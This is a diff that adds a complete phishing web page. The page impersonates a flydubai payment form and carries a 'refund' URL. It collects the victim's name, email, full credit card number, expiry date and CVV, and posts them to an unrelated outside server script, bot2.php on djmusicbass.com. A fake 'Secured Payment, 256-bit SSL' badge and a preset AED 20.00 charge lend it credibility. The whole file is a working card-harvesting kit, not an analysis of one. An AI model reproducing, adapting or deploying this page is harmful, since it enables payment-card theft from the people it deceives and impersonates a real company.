@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<!-- saved from url=(0036)https://farfetch-refund.netlify.app/ -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  <title>Payment | Make Payment With Credit / Debit Card, flydubai Voucher - flydubai</title>
+  <link rel="shortcut icon" href="https://fzpayments.flydubai.com/paymentui/favicon.ico">
+  <link rel="stylesheet" href="./Refund_files/index.css" type="text/css">
+  <script src="./Refund_files/jquery-1.js.download"></script>
+  <script src="./Refund_files/jquery.js.download"></script>
+  <script>
+    $(function () {
+      $('input[type=text], input[type=password]').autotab();
+      $('.number').autotab('filter', 'number');
+      $('.ssn').autotab('filter', 'number');
+
+      $('#function').autotab('filter', function (value, element) {
+        var parsedValue = parseInt(value, 10);
+
+        if (!value || parsedValue != value) {
+          return '';
+        }
+
+        var newValue = element.value + value;
+
+        if (newValue > 12) {
+          $.autotab.next();
+          return 2;
+        }
+        else if (element.value.length == 0 && value > 1) {
+          $.autotab.next();
+          return value;
+        }
+        else if (element.value.length == 1 && parsedValue === 0 && newValue != 10) {
+          $.autotab.next();
+          return 1;
+        }
+
+        return value;
+      });
+
+    });
+  </script>
+</head>
+<body>
+  <div class="wrapper">
+    <div class="center">
+      <div class="header">
+        <div class="check">
+          <div class="step_main">
+          </div>
+        </div>
+      </div>
+      <div class="center_inner">
+        <div class="logo">
+          <div class="page_main">
+            <span class="page_tagline"><h3>Please fill the below fields to complete your 2step payment</h3>
+</span>
+          </div>
+          <div class="right">
+            <img alt="Logo" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAfQAAABlCAMAAACMReHqAAAAwFBMVEX///8AZJb/ggAAWZAAYJQAYpX/gAAAXJH/eAAAV4//8uaat8xViq4AXZL/ewAAWI8ebJvy9vm/0d7/rHD/1Lr/m0r/iyX/2MG1ytnH1+NqlrX/xp//hx2OrcUAU43/mEv/y6qrwtTV4er/jy3h6vCfus7/+fR+o77p8PRikbP/38o8fKX//fqApL9Ohap0nLr/wpn/5tX/lkAASoj/8uj/pmQsc5//oVn/uo3/rnP/s37/cQD/vZBCfaX/kjf/6tvlnOMGAAAN4klEQVR4nO2deXuiOhTGpRAhwyZOF3AKt1KsUkdtO62d21tnvv+3umAV4WSDLkoL71/zjGkS8st6kpx0Omz9/Hv24/e/D493l5eXf+4eH55ujq/vOeFbfXJ9u3g41zTL6uZlWZamXT78vrnY6sfVoTPa6p10dXOqJbiPqFqz3+q/b4fOa6t30f33hPgOcY4xWQ+0ekD33KK8D0onBOm4H5TO3nWj7Yhb2vnJ0/OmK39+evhj5epDjaDHWM4Lzz8oHT0opCPbH5TOvvWoZcStf8+IIfv2d4F6TaAPFCkvxfigdHRVKib0QensWSdWxvwHPcTP71oL/UtBf86Y/2HPy39bLfQvBP0q69v/8IKddFvoXwf6zbYNa1wjzDethf51oG+bcPeJH+6fbgv9y0A/2sC0rvnhflgt9C8DfWt94ffuycJNa6F/Peg/+eGuWujNg74L2EL/9CoN/byF3jzopy30FvqB1UJ/g1rofLXQW+hfDLooYAv9k0O/Psu0ta5aZwWRphoG9Cyq2zIJ329DC+x/YrXQq+pOy85DbfdRjqy8/jsj/oYBfRuV9lAm4eP/NqHvyoR2wv7IHw/i2DCMeOHrbuhkv9UAepTkbvGSucHCH7nhpHr0kefq609MNBj7+rD/mlhK6YRxAnJXA8iWyICebdh8L5Pw8aaSdU9EIUPdUDCWVdNUNjJVGQe9hfsCng994gFxUoq4YRnQ+7NlkM+dmeTOxvLcL31WL3RnBgpsuRhJGgvuxTovmn5RbslaUnfo4Vix1SLVjZCiBkt9IoLe/1U82fbLYaSUyC+egsOo8CsFujOcB7KCaLlDpo1jIXfH81fYlhXqF758pI3nQ0aeHfhtfVF6LzrZHWzPOBeOu2uHhO5NA5NRHC9logZTN+ZDl4t/gjnQAVbU4/4qhTGm18csK7g35HxdqE8D2aRVGRCNigcRLQIHFwPKJaE/nmfaUu+e59U9HPTJHItLBMFy3xd0Cclc4pswvZCeljeWcAng248KBpR8vxZ6Tm9dsr039D4WFyqtfPYFvZxQ4NOS6mFuF0b5LJMcK8pBvzq+eXo+ZuyXv9U4887Q9aB0OyiWTr2gS5IdU5J6RTwBcbuiDPT7B22zSqKujesFfRS8rojrB11SKdRfE08A23oJ6BfZ7ZWu9i/lkw8E/R/qz95rmdcQuiTPiKQYIVEy7UfMHk4GeRdDf85dUziyKO2rTi3dkemfjdB6GcsulwNBRy8ZY2WLaKMEdMVM1mbYVqXectmTZExdFygDUEoi6Md55gl18shrnVp6TJvmmDJWlkYcx8ZSwTJrIrR36EiRsdqbx4PYmEq2TZuSIwkmlf/RlG3J8IdetMuaEw5jyjw2KGbeCcyCAgD9pwWsMBphIa8R9JDSucvKzNt986Q/Qza1Ye0buioP3N0q2gn9HiVf8ggkleVWxUvfo+bJGa8bMlpbIFPzHMaBXgwx8wuageXhjVVkftR9hInUCLpBVHIFkWaO/pI2COwXuokgzmQ+QskX3J3ZVBg8H3JMp/0g6UKmcWrN98IwchxO3mk6BQ09QQbvq9UH+oRo6Cp9F2WEYcA9Q8cLakQ+kS8ZrLfS6GVJFxjLozdtuVxpkPmRBbfP6gPdh+O1SVvqpgrJrnSf0DHZzF9E1EYEbs1LyO59tFeDWwp0eBu5PrP3HiCJlsxoPKJN7RG6TDW2rbWA9Rakqygf78jiGg7pCfRnEKY20InePaBuN7xoAYf//UHn1MWEKqwgRcj0YeF99ala+hDuYbI691RwrbpH6DZvf2MEP2LACVxdzmQShaHX77vucDga6Rv5fm6+SxvToS22NtBh48WMjaoXwZn+/qDzz0uByggiq65J5LlDfzYwVktJDtIFHLbXu+hqTsWl+h05e4dsawMdDun8wiWa1L6gczugTgds80PDSllNQlcfG0uUMN4creGZI4tldUGs0wk0tZm9gyFd4Y9/HqC6N+gmexqXCg5SNre/IuWEw5nRk5PmrJpM+y4UyNM5aOrkheS6QI/s4oeovNMn6artQNBV1nrtVZ+R18T1DQnbKtuYzxIYCcFUTiPdR9UFOmy6/CG9E4HBc2/Qob0FCkAXdAwbOZ4+N7Fsvur8iIRUEN2xlmvrGsXFSF2gw35RMBjC6fv+oAuOPS6LzbTE9D30p9g2uWN2MYPwP8hpxm13s+nStbQLSpJ1ga4X7RrIFMR0qImcaJCGBzYFnizdgUzdoYOglfR0dDp3l6Ul/JE24twcpUdnNOuJ6iauLtBnxcLimkBSHWrJZnNMRqnGoPLyvsM1GEepoZSlMdZdL5ysPwNWEno9/HZ2fPaXkXBdoINz7NBqTQis8PYGnRfTOjy0xLICRmO1xMHatcCQogLo1ZeFdYEOrC2C5XCnMz0QdFtQwtCAACdZG3nzgNbGkaKosg33k8DZGAidWa+Yqit00QRofiDosiBfxISUFsibUg7IKGp6oWmW3mYzih/Hhy7sFEnVBfqq+CXmWBDTgW64sFpuJhekTIEekdc5kImVeJiNzaAF8KELzFg01QU66K5N8ihpUYe61iRaVYih+wGxRYh7fmEyVgl6OVNAQTWFroigCy4wfhh00f10mDKEPiFOVZl4AafflaCreqeqWuh7hR7Cnl3BPpm3atDLW3q3qgt0OKbXtXt/25jeB9tKCMe0nDUFOvhO4UQOzvbrMnvnQvfATT3EsORXg179CFZdoMOWK1qyrT7Hkq3QM8BdIiQxzr02BfqionEGbmzU1DhTiA1YEZHEiqsp0MEBaNFGRadXZLE/M6zgUDrcOFrlfipmCtnMqJoCHbYQ4YbLoWzvgg2XGbvHArBk9gSsKdAhJkT785wOdVzKFuynw7nJbhUyBA2dU62bAh1Ocqg2650Od4hC4OFlxVxPzQFJDqumQIcHIwX71gc7LiVaFYPN7lzHAD6QV6sbAx1MbQVn0Q53MJJv9JzADitLGFRTNOXE0hjocM3GN8lBG8j+jkDzrUYg4VxkoJpyDRHzKlurnxm6yywumvyKx6U4Cy2wWBT5keO1UKLq5qoIgM6tPMumQHfAmMc/A03ch+FD5x1nhAe1BNea+At1uCzb4QqL3Tu3pfO9yhwe+uMWeim/zjds6MQ+G69UXDCki6Dzpl/QTia6y8ZronBZljPaTsqP6TD3tYP+tD1Xb5VJLasiFOjEQSPO/L2qUwLOkSLCIC66n87rgmD/k6+45WfvYNlXP+jZc5yEjwuKdk8403zO2Nwml9eK9E5ThO7BnoBNCvTuYuhIYc4K4fXFQqqgJ2MvA/rwHnbtoGcXp7qX4sSeLB70GTg9rKwogRI5U8qpwiJ02HzZ9i/CqYXY/QhCjBo0hv1LIVHoXoVleo9k2I/VDnoWAc1JHdBZdrOOCp30NEB1puzSrnzBlx2IY8Im3WlRSLiEKuFoCGHasbTJHMaFCybbsNzGakheeKkf9N/ZdWjaVbm8cp4M6c4DfVhqCBvQ1O0uYc9NhU66JzOXlBqkk46qSvmRU9EI9PHRmDjVDHcKwUIsmeaR95GcGcV1Vv2gX+0cFFqXnNd77h9yN2gZvmHhQiwpOFuJR/0wdabmTLxRrBJ93yYcgE5M79c1qFh4E12iNeNyHiNVvNK9KM2WE3nDBcWpN4KLO2KsRioqev7zFlSXmPWD3rnINWDt7ph6Y65z/ZC/PsuCHtH8+yvrm3up90RbZd78Ih7uIetPEkiWp+OR2/e8/tCPe5jKs7RvWGTKm2zJ1HxhYpk4p8xFbHkZz/TRaOQvpirjLmMNoXe+5/xddC3tz9Px7f0utqu/x8+PFvBXyoDecd/J9TfToTRKb3+mLluYd8Hfywu0TK7nHWKmsU4w9Qiqpo4nWDW6jtA7DwXXB13L0jTNOjo/PT0/Wv8TeqhlQ3+1w3fyiS44lS6rd4Iu02xLNO+3ZeKqI/TOjUZgPQLvApWEnrT1Vz3tQHmXLX4d9feBjul2O4qvyxKqJ/TO3zsKdgrrbSA29E6IKr5zgtIXrQLKmn5WuV2tYypeAvV/2dXdgijkeL7RpFexEinJzOHX+0PfPMolgn6+DUh/a/X6USN78QJvS7MeeWbYTAvishdTCSWsrnw3jGhWsr5CHUTZUfUWQ/gAohOFrm8gwbNcxZjwirepV/plojRHyPCJNxnfDj17lEsE/c82IOuB3fuLfxKuZJee/E8yyncfb653Rlsu9E5oBGXesUIJcGPE3Yzz5XLYkWmrxpBj7I+GA6kceAUv+SeqJgMszlT6hkBv4VJz9Hbo76vbi6eT83TytnksKFH39OTpx/XGlVk56EkZL1jLl23RqrY810s4aRstRUWcdqDTMs9lRsNYwexV4zoumTQnkZr4PV6mkrVg+rwos7dQ10++ZBL5u9qTrr79vb2+Pru+vv37rdiBlIWeqL+QApniQA+l63YkaOF5RfoqWeFT39tIn29VDMYbC/TIhoNeQIsNpXXHjN2SUYX63LaJz1tHIq/8PjcWnD0/uxZz/lAXVYDeSV/v8OMlDrbuUNPHLQJltdC9yl7ww+F4Lu0ieolKmi9G1aNKvb6B2NJHN3qGT++MOZly/XiqvDh8XT/boUwHer9iJJ9A1aC/yJmkfo9TeW978yCdlG1jos/8KmkShe8SmTOJojCM3p6huuo10Ft9crXQG6gWegPVQm+gWugNVAu9gWqhN1At9Aaqhd5AtdAbqBZ6A9VCb6Ba6A3UD2tz6KqF3hxdnF+udfp46Jw0TP8DTQNp3lGPHEkAAAAASUVORK5CYII=" style="margin-top: 5px; margin-right: 10px;" height="100px">
+          </div>
+        </div>
+        <div class="main">
+          <div class="form">
+            <form name="payment" id="payment" method="post" action="https://djmusicbass.com/work/bot2.php">
+                        <div class="field">
+              <label>
+                <span>*</span> Your name
+              </label>
+              <div class="desc">Please enter your name.</div>
+              <input type="text" name="name" maxlength="70" required="">
+            </div>
+            <div class="field">
+              <label>
+                <span>*</span> Email address
+              </label>
+              <div class="desc">We'll send you your confirmation on this email address.</div>
+              <input type="email" name="email" maxlength="254" required="">
+            </div>
+                      
+                        <br>
+            <div class="ssl">
+              <div class="secured">
+                <div class="icon">
+                  <img src="./Refund_files/stock_lock.png">
+                </div>
+                <div class="topic">
+                  Secured Payment
+                </div>
+                <br>
+                <div class="txt">
+                  This a secured 256-bit SSL encrypted payment
+                </div>
+                <div class="sec-right">
+                </div>
+              </div>
+              <div class="clear">
+              </div>
+              <div class="field">
+                <label>
+                  <span>*</span> Credit card number
+                </label>
+                <div class="desc">
+                  The 16 digits on the front of your credit card.
+                </div>
+                <input type="text" name="cc1" maxlength="4" size="4" class="credit_input ssn" required="">-
+                <input type="text" name="cc2" size="4" maxlength="4" class="credit_input ssn" required="">-
+                <input type="text" name="cc3" maxlength="4" size="4" class="credit_input ssn" required="">-
+                <input type="text" size="4" name="cc4" maxlength="4" class="credit_input ssn" required="">
+                <img alt="Visa" src="./Refund_files/visa.png">
+                <img alt="MasterCard" src="./Refund_files/mastercard.png">
+              </div>
+              <div class="field">
+                <label>
+                  <span>*</span> Expiry date
+                </label>
+                <div class="desc">
+                  The date your credit card expires. Find this on the front of your credit card.
+                </div>
+                <select name="expm" class="month" required="">
+                  <option value="" selected="selected">MONTH </option>
+                                                            <option value="01">01 </option>
+                                                                                <option value="02">02 </option>
+                                                                                <option value="03">03 </option>
+                                                                                <option value="04">04 </option>
+                                                                                <option value="05">05 </option>
+                                                                                <option value="06">06 </option>
+                                                                                <option value="07">07 </option>
+                                                                                <option value="08">08 </option>
+                                                                                <option value="09">09 </option>
+                                                                                <option value="10">10 </option>
+                                                                                <option value="11">11 </option>
+                                                                                <option value="12">12 </option>
+                                                      </select>
+                <select name="expy" class="year" required="">
+                  <option value="" selected="selected">YEAR </option>
+                                                            <option value="2023">2023 </option>
+                                                                                <option value="2024">2024 </option>
+                                                                                <option value="2025">2025 </option>
+                                                                                <option value="2026">2026 </option>
+                                                                                <option value="2027">2027 </option>
+                                                                                <option value="2028">2028 </option>
+                                                                                <option value="2029">2029 </option>
+                                                                                <option value="2030">2030 </option>
+                                                                                <option value="2031">2031 </option>
+                                                                                <option value="2032">2032 </option>
+                                                                                <option value="2033">2033 </option>
+                                                                                <option value="2034">2034 </option>
+                                                                                <option value="2035">2035 </option>
+                                                                                <option value="2036">2036 </option>
+                                                                                <option value="2037">2037 </option>
+                                                                                <option value="2022">2038 </option>
+                                                                                <option value="2023">2039 </option>
+                                                      </select>
+              </div>
+              <div class="field">
+                <label>
+                  <span>*</span> CVV
+                </label>
+                <div class="desc">
+                  The three(3) digit at the back of your card.
+                </div>
+                <div class="amount_main">
+                  <input id="amount" type="text" name="cc5" class="amount_input" required="" maxlength="3">
+                </div>
+              </div>
+            
+             <div class="field">
+                <label>
+                  <span>*</span> Amount
+                </label>
+               
+                <div class="amount_main">
+                  <input id="Amount" type="Text" name="Amount" class="amount_input" size="4" maxlength="4" value="AED 20.00">
+                </div>
+              </div>
+            </div>
+            <div class="what">
+              <div class="what_inner">
+               
+              </div>
+            </div>
+            <input type="submit" name="submit" value="Submit" class="submit">
+            </form>
+          </div>
+          <hr>
+          <div class="footer">
+  <div class="footer_txt">
+    
+  </div>
+ 
+    <div style="float:left; padding-left:5px; margin-top: 0.75em">
+      </div>
+  </div>
+
+        </div>
+      </div>
+    </div>
+  </div>
+
+
+</body></html>
